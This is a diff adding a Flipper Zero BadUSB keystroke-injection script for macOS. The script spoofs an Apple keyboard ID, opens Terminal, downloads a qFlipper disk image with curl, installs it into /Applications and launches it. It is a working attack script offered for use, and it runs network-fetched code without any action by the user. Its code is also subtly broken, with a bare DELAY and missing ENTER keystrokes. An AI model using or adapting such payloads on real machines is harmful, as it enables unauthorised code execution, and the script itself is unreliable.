@@ -1,0 +1,29 @@
+ID 05ac:021e Apple:Keyboard     // This line must be first IF (and only if), it is the first time ever that a bad-usb (or bad-bluetooth) attack has been launched on THIS specific macOS with THIS specific FlipperZero, as it serves to identify it as an original Apple keyboard. The following times (or if Flipper Zero has already been identified by this macOS) this line will be deleted before executing the attack.
+REM Author: 47LeCoste
+REM Version 1.0 (Flipper Ducky)
+REM Target: macOS
+DELAY 300
+GUI SPACE
+DELAY 1000
+STRING Terminal
+DELAY 1000
+ENTER
+DELAY 1000
+STRING curl -o ~/Downloads/qFlipper.dmg -L https://update.flipperzero.one/builds/qFlipper/1.3.2/qFlipper-1.3.2.dmg
+DELAY 6000
+DELAY
+STRING cd ~/Downloads
+DELAY 500
+STRING open qFlipper.dmg
+DELAY 7000
+STRING cd /Volumes/qFlipper
+TAB
+DELAY 200
+ENTER
+STRING mv qFlipper.app /Applications
+DELAY 500
+STRING cd /Applications
+DELAY 200
+ENTER
+DELAY 500
+STRING open qFlipper.app
